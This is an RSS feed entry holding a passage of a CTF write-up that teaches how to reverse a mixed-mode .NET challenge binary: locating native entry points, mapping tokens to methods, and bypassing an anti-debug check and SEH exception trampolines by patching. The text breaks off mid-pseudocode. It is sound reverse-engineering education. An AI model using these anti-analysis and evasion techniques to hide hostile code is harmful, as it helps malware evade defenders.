<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>The Workshop</title>
        <subtitle></subtitle>
        <icon>https://the-m3chanic.github.io/images/favicon.ico</icon>
        <link>https://the-m3chanic.github.io</link>
        <author>
          <name>Suraj Kumar</name>
        </author>
        <description></description>
        <language>en</language>
        <pubDate>Wed, 16 Jul 2025 22:09:33 +0000</pubDate>
        <lastBuildDate>Wed, 16 Jul 2025 22:09:33 +0000</lastBuildDate>
        <item>
            <guid isPermalink="true">https://the-m3chanic.github.io/2025/07/16/avernos-bi0s-CTF-2025/</guid>
            <title>avernos - bi0s CTF 2025</title>
            <link>https://the-m3chanic.github.io/2025/07/16/avernos-bi0s-CTF-2025/</link>
            <category term="Writeup" scheme="https://the-m3chanic.github.io/categories/Writeup/" />
            <category term=".NET" scheme="https://the-m3chanic.github.io/tags/NET/" />
            <category term="Reversing" scheme="https://the-m3chanic.github.io/tags/Reversing/" />
            <category term="CTF" scheme="https://the-m3chanic.github.io/tags/CTF/" />
            <category term="Writeup" scheme="https://the-m3chanic.github.io/tags/Writeup/" />
            <category term="Mixed-mode" scheme="https://the-m3chanic.github.io/tags/Mixed-mode/" />
            <pubDate>Wed, 16 Jul 2025 22:09:33 +0000</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Mixed mode assembly (a feature of .NET binaries), involving both C# as well as C++ code in the same executable&lt;/li&gt;
&lt;li&gt;Code flow jumps between both C#/C++ frequently to make analysis harder&lt;/li&gt;
&lt;li&gt;SEH mechanism triggered in C++ code, which uses SEH trampoline to make debugging harder&lt;/li&gt;
&lt;li&gt;SEH triggered once again in C#, which is handled by C++&lt;/li&gt;
&lt;li&gt;VM bytecode is decrypted loaded by C#&lt;/li&gt;
&lt;li&gt;VM checks input in 4 ways: CRC32 hash (2 byte pairs), RC4 encryption, rolling XOR and byte by byte checks&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Challenge Points&lt;/strong&gt;: 838&lt;br /&gt;
&lt;strong&gt;No. of solves&lt;/strong&gt;: 18&lt;br /&gt;
&lt;strong&gt;Challenge author&lt;/strong&gt;: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94LmNvbS90aGVfbTNjaGFuaWNf&#34;&gt;the.m3chanic&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;challenge-description&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#challenge-description&#34;&gt;#&lt;/a&gt; Challenge Description&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;An ancient engine stirs in the dark. It speaks no language you know.&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;prelude&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#prelude&#34;&gt;#&lt;/a&gt; Prelude&lt;/h3&gt;
&lt;p&gt;[Note: I will be showing you the author mindset, on how one can approach such a challenge - this will not be a very ctf-style writeup, but more of a teaching process]&lt;/p&gt;
&lt;p&gt;After reading this writeup, you will (hopefully) be able to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Identify and analyse Mixed Mode .NET samples&lt;/li&gt;
&lt;li&gt;Reverse Engineer a custom Virtual Machine&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;analysis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#analysis&#34;&gt;#&lt;/a&gt; Analysis&lt;/h2&gt;
&lt;p&gt;I will be splitting this writeup into 3 main parts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;What is mixed mode assembly?&lt;/li&gt;
&lt;li&gt;Reversing mixed mode samples (using this challenge as an example)&lt;/li&gt;
&lt;li&gt;The VM&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Before jumping into reading this, I would suggest some prerequisite reading on the following topics:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;What is .NET? (&lt;a href=&#34;https://the-m3chanic.github.io/2024/05/08/R2R-Ready-to-Run-Stomping-WTF/&#34;&gt;My blog which explains it&lt;/a&gt;, &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL2RvdG5ldC9mcmFtZXdvcmsvZ2V0LXN0YXJ0ZWQvb3ZlcnZpZXc=&#34;&gt;Microsoft reference&lt;/span&gt;, &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2NzaGFycC9jb21tZW50cy8xN3B1N2Z4L2Nhbl9hbnlvbmVfZXhwbGFpbl93aGF0X2lzX25ldC8=&#34;&gt;Reddit&lt;/span&gt;)&lt;/li&gt;
&lt;li&gt;What are &amp;quot;managed&amp;quot; and &amp;quot;native&amp;quot; methods? (&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL0BEZXZDaHkvbWFuYWdlZC12cy11bm1hbmFnZWQtY29kZS1lY2VmM2FmZjJkNjU=&#34;&gt;Medium post&lt;/span&gt;, &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL2RvdG5ldC9zdGFuZGFyZC9tYW5hZ2VkLWNvZGU=&#34;&gt;Microsoft reference&lt;/span&gt;, &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvbWFuYWdlZC1jb2RlLWFuZC11bm1hbmFnZWQtY29kZS1pbi1uZXQv&#34;&gt;GFG&lt;/span&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;mixed-mode-assembly&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mixed-mode-assembly&#34;&gt;#&lt;/a&gt; Mixed mode assembly&lt;/h2&gt;
&lt;h3 id=&#34;what-is-mixed-mode-assembly&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#what-is-mixed-mode-assembly&#34;&gt;#&lt;/a&gt; What is mixed mode assembly?&lt;/h3&gt;
&lt;p&gt;A &lt;em&gt;mixed mode assembly&lt;/em&gt; in .NET refers to a compiled binary that contains both &lt;strong&gt;managed&lt;/strong&gt; as well as &lt;strong&gt;unmanaged&lt;/strong&gt; code. To break that down:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Managed code&lt;/strong&gt; is the code that runs under the control of the .NET Common Language Runtime (CLR). Examples of this include C# or &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1ZCLk5FVA==&#34;&gt;VB.NET&lt;/span&gt; code&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Unmanaged code&lt;/strong&gt; is code that runs directly on the Windows OS without the CLR&#39;s oversight, and this is typically written in C/C++&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;why-use-mixed-mode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#why-use-mixed-mode&#34;&gt;#&lt;/a&gt; Why use mixed mode?&lt;/h3&gt;
&lt;p&gt;Functionally, there are many beneficial use cases of having both managed as well as unmanaged code in the same binary. Some of them include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;interoperability between the two modes&lt;/li&gt;
&lt;li&gt;Optimising performance-critical sections of managed code (C++ runs way faster than managed code)&lt;/li&gt;
&lt;li&gt;Leveraging existing code by taking advantage of interoperability between managed and unmanaged code&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;They are enabled using C++/CLI (Common Language Infrastructure), which allows C++ to interoperate directly with .NET classes. This allows you to write native code as well as managed code in the same project and even in the same source file.&lt;/p&gt;
&lt;h3 id=&#34;how-does-it-work-under-the-hood&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#how-does-it-work-under-the-hood&#34;&gt;#&lt;/a&gt; How does it work under the hood?&lt;/h3&gt;
&lt;p&gt;Mixed mode assemblies are unique because they satisfy two very different runtime expectations simultaneously: the native Windows loader and the .NET CLR. How does this work in practice though?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A mixed mode binary is still a standard PE file&lt;/li&gt;
&lt;li&gt;It contains both:
&lt;ul&gt;
&lt;li&gt;Native sections:  &lt;code&gt;.text&lt;/code&gt; ,  &lt;code&gt;.data&lt;/code&gt; ,  &lt;code&gt;.rdata&lt;/code&gt; , etc., compiled from C++&lt;/li&gt;
&lt;li&gt;Managed metadata: a CLR header, metadata tables, and IL bytecode (if present)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;When the OS loads the binary, it sees the native entry point ( &lt;code&gt;WinMain&lt;/code&gt; ) and begins execution like a regular native application&lt;/li&gt;
&lt;li&gt;Simultaneously, because the PE includes a CLR header and its metadata, the .NET runtime is also initialised and loaded via the  &lt;code&gt;_CorExeMain&lt;/code&gt;  or  &lt;code&gt;_CorDllMain&lt;/code&gt; , depending on whether it&#39;s an EXE or DLL&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;loader-behaviour&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#loader-behaviour&#34;&gt;#&lt;/a&gt; Loader behaviour&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;The Windows PE loader first processes the native parts. This allows the mixed mode assembly to include custom startup routines written in native code&lt;/li&gt;
&lt;li&gt;Usually, this begins with  &lt;code&gt;mainCRTStartup&lt;/code&gt; , which is the standard C runtime startup stub generated by the MSVC toolchain. This stub sets up the runtime environment, initialises global variables, and eventually calls  &lt;code&gt;main&lt;/code&gt; ,  &lt;code&gt;WinMain&lt;/code&gt; , or  &lt;code&gt;wWinMain&lt;/code&gt;  - depending on the system&lt;/li&gt;
&lt;li&gt;In a mixed mode assembly, this native entry point might call  &lt;code&gt;_CorExeMain&lt;/code&gt; , which is responsible for bootstrapping the CLR&lt;/li&gt;
&lt;li&gt;These two systems &lt;em&gt;coexist in the same process space&lt;/em&gt;, which is what makes mixed mode so difficult to analyse&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Not all mixed mode binaries use  &lt;code&gt;mainCRTStartup&lt;/code&gt;  directly. Some may use a custom entry point or modified CRT startup to gain more control over execution flow. However, in most cases compiled via standard C++/CLI,  &lt;code&gt;mainCRTStartup&lt;/code&gt;  is the default native entry point.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Functions written in managed code can call native functions using &lt;a href=&#34;https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke&#34;&gt; &lt;code&gt;P/Invoke&lt;/code&gt; &lt;/a&gt; or  &lt;code&gt;DllImport&lt;/code&gt;  attributes&lt;/li&gt;
&lt;li&gt;Native code compiled with C++/CLI can directly reference and instantiate managed types&lt;/li&gt;
&lt;li&gt;This means the transition between C# and C++ isn’t just at a function-level - it can go as deep as shared objects and class methods&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In essence, mixed mode assemblies live in both worlds simultaneously. They can present a well behaved .NET facade while hiding all the juicy logic and the humble malware code on the native side (which are completely opaque to most .NET tools).&lt;/p&gt;
&lt;h2 id=&#34;reversing-a-mixed-mode-sample&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reversing-a-mixed-mode-sample&#34;&gt;#&lt;/a&gt; Reversing a Mixed Mode sample&lt;/h2&gt;
&lt;p&gt;So let us begin analysis of this sample as we would for any binary - starting from how you would even identify whether a sample is mixed-mode or not.&lt;/p&gt;
&lt;p&gt;Running  &lt;code&gt;file&lt;/code&gt;  on the sample tells us it&#39;s a  &lt;code&gt;x86-64 Mono/.NET assembly&lt;/code&gt;  file&lt;br /&gt;
&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image.png&#34; alt=&#34;output of the file command&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This does not wave any red flags, just tells us this binary has managed code. Nothing too special.&lt;/p&gt;
&lt;p&gt;One thing I like to do to get this confusion out of the way always is to open the binary in a PE-inspection tool like &lt;a href=&#34;https://ntcore.com/explorer-suite/&#34;&gt; &lt;code&gt;CFF Explorer&lt;/code&gt; &lt;/a&gt;, and check out if it has a IL entry point or not.&lt;br /&gt;
The way to do this is to check the  &lt;code&gt;Flags&lt;/code&gt;  section in the  &lt;code&gt;.NET Directory&lt;/code&gt;  of the binary (I am using CFF Explorer).&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-1.png&#34; alt=&#34;cff explorer output&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Check out the 2 flags I&#39;ve highlighted, these say right off the bat that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The binary contains stuff which is &lt;em&gt;not&lt;/em&gt; IL code&lt;/li&gt;
&lt;li&gt;The binary does &lt;em&gt;not&lt;/em&gt; have a native entrypoint&lt;br /&gt;
Which means: The binary contains native code and it&#39;s startup is in the managed code (which is most definitely  &lt;code&gt;mainCRTStartup&lt;/code&gt; )&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now that we know where the code execution is about to begin, let&#39;s open up the binary in a .NET decompiler (I prefer dnSpy for these).&lt;/p&gt;
&lt;p&gt;Another dead giveaway that this binary contains native code is the existence of CPP metadata as shown in dnSpy&lt;br /&gt;
&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-2.png&#34; alt=&#34;dnSpy cpp metadata&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Looking for  &lt;code&gt;mainCRTStartup&lt;/code&gt;  in dnSpy:&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-3.png&#34; alt=&#34;mainCRTStartup&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Okay, three terms to note before we proceed:&lt;/p&gt;
&lt;h3 id=&#34;token&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#token&#34;&gt;#&lt;/a&gt; Token&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A unique identifier given to every metadata object (like a method, type, field, etc.)&lt;/li&gt;
&lt;li&gt;A 4-byte value where:
&lt;ul&gt;
&lt;li&gt;The high byte indicates the metadata table type&lt;/li&gt;
&lt;li&gt;The low 3 bytes indicate the row index in that table&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;In our case:  &lt;code&gt;0x0600005D&lt;/code&gt; :
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0x06&lt;/code&gt;  -&amp;gt;  &lt;code&gt;MethodDef&lt;/code&gt;  table (all method definitions) (&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubnRjb3JlLmNvbS9maWxlcy9kb3RuZXRmb3JtYXQuaHRt&#34;&gt;Source&lt;/span&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x00005D&lt;/code&gt;  -&amp;gt; Row index  &lt;code&gt;0x5D&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;More of this info can be found within  &lt;code&gt;ILDasm&lt;/code&gt;  or  &lt;code&gt;dnSpy&lt;/code&gt;  itself&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;rid&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rid&#34;&gt;#&lt;/a&gt; RID&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;This is shorthand for the row index inside the metadata table&lt;/li&gt;
&lt;li&gt;It&#39;s the &amp;quot;number&amp;quot; part of the token&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;rva&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rva&#34;&gt;#&lt;/a&gt; RVA&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Relative Virtual Address, is the offset (in memory) from the /images/post_images/avernos-bi0s-CTF-2025/image base (typically  &lt;code&gt;0x14000000&lt;/code&gt; ) to the method&#39;s actual compiled code in the PE&#39;s  &lt;code&gt;.text&lt;/code&gt;  section&lt;/li&gt;
&lt;li&gt;This is where the JIT compiler (or loader) will find the native stub or unmanaged entry point&lt;/li&gt;
&lt;li&gt;If you open the binary in IDA/Ghidra/Binary Ninja, and go to the offset  &lt;code&gt;0x4464&lt;/code&gt; , you will find the implementation of the method/function.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;file-offset&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#file-offset&#34;&gt;#&lt;/a&gt; File Offset&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;The raw byte offset in the file where this method&#39;s code resides on the disk&lt;/li&gt;
&lt;li&gt;This is useful when:
&lt;ul&gt;
&lt;li&gt;Looking at the binary in a hex editor&lt;/li&gt;
&lt;li&gt;Manually extracting or patching bytes&lt;/li&gt;
&lt;li&gt;Mapping RVA to file offset via PE Header section tables&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So now we know the address of the  &lt;code&gt;mainCRTStartup&lt;/code&gt;  method in the native section, it is simply the base address of the loaded /images/post_images/avernos-bi0s-CTF-2025/image in IDA + the  &lt;code&gt;RVA&lt;/code&gt;  of the method as shown by dnSpy.&lt;/p&gt;
&lt;p&gt;Now, one thing to note when loading it in a native decompiler/disassembler is to specify to your tool to load it as a  &lt;code&gt;PE&lt;/code&gt;  file as compared to a  &lt;code&gt;Microsoft.Net assembly&lt;/code&gt;  file.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-4.png&#34; alt=&#34;ida pick which file type&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now, hit  &lt;code&gt;G&lt;/code&gt;  to be able to jump to any address, and paste the  &lt;code&gt;base_addr + RVA&lt;/code&gt;  value into the field. (Find the base address from  &lt;code&gt;Edit -&amp;gt; Segments -&amp;gt; Rebase Program&lt;/code&gt; , and copy the  &lt;code&gt;Value&lt;/code&gt;  field from there - for me, the base is  &lt;code&gt;0x140000000&lt;/code&gt; ).&lt;br /&gt;
So the address to jump to, would be  &lt;code&gt;0x140004464&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-5.png&#34; alt=&#34;mainCRTStartup&#34; /&gt;&lt;/p&gt;
&lt;p&gt;And just like that, we have our &amp;quot;main&amp;quot; (well, not really)&lt;br /&gt;
In standard Windows fashion, we need to do a &lt;em&gt;little&lt;/em&gt; more digging before we actually find the main code. The first function called usually only performs setup for the actual code to run, which would be the one being returned.&lt;/p&gt;
&lt;p&gt;Similarly, in the next function - look for the 2nd to last function being called after  &lt;code&gt;argv&lt;/code&gt; ,  &lt;code&gt;argc&lt;/code&gt;  and  &lt;code&gt;envp&lt;/code&gt;  are initialised. For us, that would be the function at  &lt;code&gt;0x140003BA0&lt;/code&gt;  (line 58 in my decompilation).&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-6.png&#34; alt=&#34;argv and argc setup&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Finally, we can start analysing the actual  &lt;code&gt;main&lt;/code&gt;  function of the binary.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-7.png&#34; alt=&#34;actual main&#34; /&gt;&lt;/p&gt;
&lt;p&gt;From some looking, the function at  &lt;code&gt;0x140003DD8&lt;/code&gt;  seems to initialise an array with some unknown values, copies that to the argument passed, then returns it. This return value is then passed to the next function.&lt;br /&gt;
But if we look at  &lt;code&gt;0x140007070&lt;/code&gt; , it just seems to be pointing to some  &lt;code&gt;qword&lt;/code&gt;  value, which resolves to  &lt;code&gt;0x6000011&lt;/code&gt;  - what could this be?&lt;br /&gt;
This is actually the  &lt;code&gt;Token&lt;/code&gt;  of the method being called from C++ -&amp;gt; C#, and we can use this as a lookup value to find the actual function in C# being referenced.&lt;/p&gt;
&lt;p&gt;If we hop back to dnSpy, and lookup that value in the same  &lt;code&gt;&amp;lt;Module&amp;gt;&lt;/code&gt;  place we looked at before, we see this&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-8.png&#34; alt=&#34;c# decrypt function&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We can see this performs a XOR decrypt of the byte array provided to it and returns the corresponding result to  &lt;code&gt;v1&lt;/code&gt; , which is meant to be a file which is to be opened in read mode, and the file descriptor returned to  &lt;code&gt;v5&lt;/code&gt; .&lt;br /&gt;
The path of the file returned is  &lt;code&gt;/home/the.m3chanic/bi0s-ctf-25/crazy-path/hehe/flag.txt&lt;/code&gt;  - which is obviously not going to exist on a given machine. Let us see how this file descriptor is being further used.&lt;/p&gt;
&lt;p&gt;In the remnant of the function, we can see  &lt;code&gt;func2(fd)&lt;/code&gt;  is being called with the file descriptor of the  &lt;code&gt;flag.txt&lt;/code&gt;  file (which, does not exist btw), which again points to the TID  &lt;code&gt;0x6000009&lt;/code&gt; , which if we lookup in dnSpy gives us&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-9.png&#34; alt=&#34;dnspy func2 first c# trigger exception&#34; /&gt;&lt;/p&gt;
&lt;p&gt;[I wrote this writeup over multiple days, and it seems my IDA database decided to rebase itself to a different address, the concept of mapping a function from dnSpy to a native decompiler still remains the same though! You can refer to this updated base address hereon:  &lt;code&gt;0x7FF7DF220000&lt;/code&gt; ]&lt;/p&gt;
&lt;p&gt;It seems to set up some values, and then XORs something and then divides them with the value it was passed as a parameter. Now we know this value is  &lt;code&gt;0&lt;/code&gt;  on our machine, but wouldn&#39;t that cause a  &lt;code&gt;DivideByZero&lt;/code&gt;  exception?&lt;br /&gt;
Let us take a look at the assembly when  &lt;code&gt;func2(fd)&lt;/code&gt;  is being called.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-10.png&#34; alt=&#34;try except for func2 call&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Aha! So it is being set up inside a  &lt;code&gt;try&lt;/code&gt;  block, and the exception handler for that block is present at  &lt;code&gt;0x7FF7DF223C27&lt;/code&gt; , let us see what happens there.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-11.png&#34; alt=&#34;first exception handler chain asm&#34; /&gt;&lt;/p&gt;
&lt;p&gt;So as we can see, in the exception handler for our first exception, it is calling a function at  &lt;code&gt;0x7FF7DF22188C&lt;/code&gt; , and based on the return value it either exits from the main function or it enters our 2nd interesting block - so it is definitely worth checking out.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-12.png&#34; alt=&#34;first anti debug check&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This is a classic anti-debug check, wherein it tries to open the file of the current process. Usually, debuggers read the debug information of the process from the file - and if this handle is not closed then the process cannot open this file - meaning that a failed call indicates the presence of a debugger.&lt;/p&gt;
&lt;p&gt;To bypass this, we can just patch out the call to this anti-debug function with  &lt;code&gt;nops&lt;/code&gt;  and patch the  &lt;code&gt;jz&lt;/code&gt;  to a  &lt;code&gt;jmp&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;The 2nd block is quite easy as well - it calls  &lt;code&gt;rand()&lt;/code&gt; , xors the result with itself and calls  &lt;code&gt;rand()&lt;/code&gt;  again and attempts to divide the result with the result of the previous xor (which would be 0) - thus causing a  &lt;code&gt;DivideByZero&lt;/code&gt;  exception yet again.&lt;br /&gt;
If you observe closely, even this 2nd block is wrapped in a  &lt;code&gt;try&lt;/code&gt; , which means our  &lt;code&gt;except&lt;/code&gt;  (at  &lt;code&gt;0x7FF7DF223C67&lt;/code&gt; ) must be where we should look.&lt;/p&gt;
&lt;p&gt;Looking at the block, it calls  &lt;code&gt;0x7FF7DF221924&lt;/code&gt;  - which has the same routine as the 2nd interesting block, which again has the same routine - which eventually calls  &lt;code&gt;func6()&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;What we just witnessed in assembly is what I would call a trampoline of sorts. It looks something like this in pseudocode:&lt;br /&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;trampoline1&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cause_exception;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __except &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        handle_exception;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        trampoline2();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;trampoline2&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cause_exception;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __except &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        handle_exception;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        trampoline3();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;trampoline3&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cause_exception;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __except 